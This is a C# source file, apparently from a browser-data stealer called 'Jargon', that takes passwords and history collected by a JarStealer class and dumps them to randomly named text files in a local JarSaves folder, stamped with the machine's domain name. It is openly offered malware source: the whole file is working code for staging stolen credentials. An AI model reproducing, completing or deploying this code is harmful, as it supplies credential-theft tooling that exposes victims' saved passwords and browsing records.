using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace Jargon
{
    internal class Utilties
    {
        public static void InitilaizeConsole()
        {
            Console.Title = "Jargon By Gerçek Joker";
            Console.ForegroundColor = ConsoleColor.White;

        }

        public static string RandomString(int length)
        {
            Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }


        public static void HistoryToFile()
        {
            if (JarStealer.historys.Count <= 0) { return; }
            string toName = "history_"+RandomString(5) + ".txt";
            string toSave = $@"{Directory.GetCurrentDirectory()}\JarSaves\{toName}";

            if (!Directory.Exists(Directory.GetCurrentDirectory() + @"\" + "JarSaves"))
            {
                Directory.CreateDirectory(Directory.GetCurrentDirectory() + @"\" + "JarSaves");
            }
            File.AppendAllText(toSave, $"Jargon By Gerçek Joker | {TimeZone.CurrentTimeZone.ToLocalTime(DateTime.Now)} | Running On : {Environment.UserDomainName}");
            foreach (var history in JarStealer.historys)
            {
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, "---------------------------------");
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, history.title);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, history.url);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, history.visit_count);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, "---------------------------------");
                File.AppendAllText(toSave, Environment.NewLine);
            }
        }

        public static void PasswordsToFile()
        {
            if (JarStealer.passwords.Count <= 0) { return; }
            string toName = "password_"+RandomString(5)+".txt";
            string toSave = $@"{Directory.GetCurrentDirectory()}\JarSaves\{toName}";

            if(!Directory.Exists(Directory.GetCurrentDirectory() + @"\" + "JarSaves"))
            {
                Directory.CreateDirectory(Directory.GetCurrentDirectory() + @"\" + "JarSaves");
            }
            File.AppendAllText(toSave, $"Jargon By Gerçek Joker | {TimeZone.CurrentTimeZone.ToLocalTime(DateTime.Now)} | Running On : {Environment.UserDomainName}");
            foreach (JarPassword password in JarStealer.passwords)
            {
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, "---------------------------------");
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, password.ORIGIN);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, password.NAME);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, password.VALUE);
                File.AppendAllText(toSave, Environment.NewLine);
                File.AppendAllText(toSave, "---------------------------------");
                File.AppendAllText(toSave, Environment.NewLine);
            }
          

        }
    }
}

